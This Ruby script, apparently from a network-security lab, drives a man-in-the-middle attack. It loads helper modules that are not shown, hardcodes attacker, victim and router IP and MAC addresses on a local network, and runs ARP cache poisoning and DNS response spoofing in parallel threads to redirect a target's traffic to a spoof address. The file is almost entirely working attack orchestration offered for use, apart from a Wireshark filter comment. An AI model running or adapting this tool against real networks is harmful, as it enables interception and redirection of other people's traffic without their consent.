#!/usr/bin/env ruby

# Wireshark filter: dns.resp.addr eq 174.7.33.60 && eth.addr eq 78:2b:cb:a3:da:ef

require 'packetfu'
require 'rubygems'
require 'thread'

# Local Ruby Files
curdir = File.dirname(__FILE__)
require curdir + '/arpSpoof.rb'
require curdir + '/dnsSpoof.rb'

# Global Variables

@attackerAddress = 	'192.168.0.7'		# MITM IP Address
@victimAddress = 	'192.168.0.8'		# Target IP Address
@routerAddress = 	'192.168.0.100'		# Router IP Address

@attackerMAC = 		"78:2b:cb:9e:c8:8a"	# MITM MAC Address
@victimMAC = 		'78:2b:cb:96:b9:51'	# Target MAC Address
@routerMAC = 		"00:1a:6d:38:15:ff"	# Router MAC Address

@spoofAddress =		"192.168.0.9"

# Our Interface, hardcoded to eliminate weird lookup errors
@interface = "em1"

# Check if user is running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

begin
	arp = ARPSpoof.new(@victimAddress, @victimMAC, @routerAddress, 
			   @routerMAC, @interface, @attackerAddress, @attackerMAC)

	dns = DNSSpoof.new(@spoofAddress, @victimAddress, @interface)

	arp_thread = Thread.new { arp.start }
	sleep(2)
	dns_thread = Thread.new{ dns.start }
	
	# Start both spoofing threads
	
	arp_thread.join
	sleep(2)	
	dns_thread.join
	
	# Catch CTRL^C
	rescue Interrupt

	# Stop ARP spoofing
	puts "\nCaught Ctrl-C"
	puts "Killing ARP Poision Thread"
	Thread.kill(arp_thread)
	arp.stop

	# Stop DNS spoofing
	puts "Killing DNS Spoof Thread"
	Thread.kill(dns_thread)

	# `echo 0 > /proc/sys/net/ipv4/ip_forward`
	exit 0
end
